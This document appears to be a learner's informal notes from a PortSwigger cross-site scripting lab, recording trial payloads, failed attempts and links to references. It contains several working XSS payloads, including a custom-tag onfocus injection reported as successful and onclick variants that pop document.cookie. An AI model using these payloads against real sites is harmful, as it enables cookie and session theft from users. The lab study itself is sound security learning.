&lt;script&rt;

<script>alert(document.cookie)</script>

this didn't seem to work 

HMMMM

https://stackoverflow.com/questions/5068951/what-do-lt-and-gt-stand-for#:~:text=%3E%20and%20%3C%20is%20a,(%20%3C%20).

'&lt;script&gt;alert(document.cookie)&lt;/script&gt;'

the search result is rendered as an h1 

what does the below input do? 
yeeeeee&lt;/h1&gt;

'&lt;h2&gt;yeeeeee&lt;/h2&gt';

'yeeeeee&lt;/h1&gt;'


hello'&lt;h2&gt;yeeeeee&lt;/h2&gt;'there

&#39 is the html code for '

&#39;&lt;h2&gt;yeeeeee&lt;/h2&gt;&#39;

I don't know if I fully understand this article yet but I know I'll get it, HMMM

this looks interesting too

this doesn't work, but body does not appear in the output 
<body style="color:red">helllo<script>test</script></body>

hmmm

<body style="color:red">helllo&lt;script&gt;test&lt/script&gt;there</body>

nope, does not work... 


<body style="color:red">helllo&lt;script&gt;test&lt/script&gt;there</body>


<body style="color:red">helllo&lt;script&gt;test&lt/script&gt;there</body>

ononline isn't blocked 

hmmm there is this cheat sheet here 
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

I copied and pasted this into the url 
<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
and it worked, but I don't fully understand how. I don't understand how that # makes it focus on that object. 
And what is the x at the end of the URL for? 

so I might have been doing something wrong, I should attack the url, not the box. hmmm

this link is def useful

------
this is for the same lab but the one where all tags are disabled except custom ones... 
this works when you click on it
<xss onclick="alert(document.cookie)">test</xss>

but I have to get the alert to show up when the page loads. somehow

onload only works for certain tags, so lets see if there are any global tags... hmmmm

https://www.w3schools.com/tags/ref_standardattributes.asp

hmmm well according to this, onload should work for anything
https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes

maybe testing it here will help me figure out if i can get it to work?
https://www.w3schools.com/tags/tryit.asp?filename=tryhtml5_ev_onpageshow

so i see that the <xss> tag is rendered...
'<xss>yee</xss>

using href only works with <a>
https://www.w3schools.com/tags/att_a_href.asp

can i get an a in there somehow???
<xss onclick="alert(document.cookie)">&lt;a&gt;</xss>

<xss onclick="alert(document.cookie)">&lt;a href="javascript:alert(1)&gt;test&lt;/a&gt;</xss>
